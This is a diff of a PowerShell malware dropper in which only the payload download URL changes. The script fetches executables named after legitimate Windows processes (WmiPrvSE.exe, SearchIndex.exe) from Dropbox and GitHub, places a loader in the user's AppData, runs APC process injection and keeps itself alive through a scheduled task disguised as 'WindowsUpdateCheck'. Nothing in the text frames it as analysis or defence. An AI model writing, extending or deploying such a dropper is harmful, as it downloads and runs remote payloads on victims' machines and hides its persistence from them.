@@ -3,7 +3,7 @@
 # ==========================================
 
 # --- CONFIGURATION ---
-$PayloadUrl = 'https://www.dropbox.com/scl/fi/x6s38mn7hyakminmivyqz/WmiPrvSE.exe?rlkey=3dimz2btxhy6p1x27oh10ghxn&st=ydc48ph3&dl=1'
+$PayloadUrl = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/WmiPrvSE.exe'
 $LoaderUrl  = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/SearchIndex.exe'
 $LoaderPath = "$env:APPDATA\Microsoft\Windows\Templates\SearchIndex.exe"
 $TaskName   = "WindowsUpdateCheck"
@@ -105,3 +105,4 @@ Invoke-APCInjection -PayloadUrl $PayloadUrl
 
 # --- 5. START PERSISTENCE LOOP ---
 Start-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
+
